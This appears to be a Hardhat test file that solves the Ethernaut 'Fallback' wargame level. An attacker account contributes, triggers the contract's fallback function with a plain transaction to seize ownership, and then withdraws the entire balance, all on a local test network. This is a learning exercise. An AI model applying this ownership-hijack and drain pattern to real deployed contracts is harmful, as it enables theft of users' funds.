import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Fallback} from '../../types/typechain';

describe('Ethernaut 1: Fallback', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Fallback;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Fallback', owner).then(f => f.deploy());
    await contract.deployed();

    // owner makes some contributions
    await contract.contribute({value: 100});
  });

  it('should hijack ownership & call withdraw', async () => {
    // contribute
    await contract.connect(attacker).contribute({value: 1});

    // fallback
    await attacker.sendTransaction({
      to: contract.address,
      value: 1,
      data: undefined,
    });

    // confirm ownership
    expect(await contract.owner()).to.eq(attacker.address);

    // withdraw
    await contract.connect(attacker).withdraw();
  });

  after(async () => {
    expect(await ethers.provider.getBalance(contract.address)).to.eq(0);
  });
});
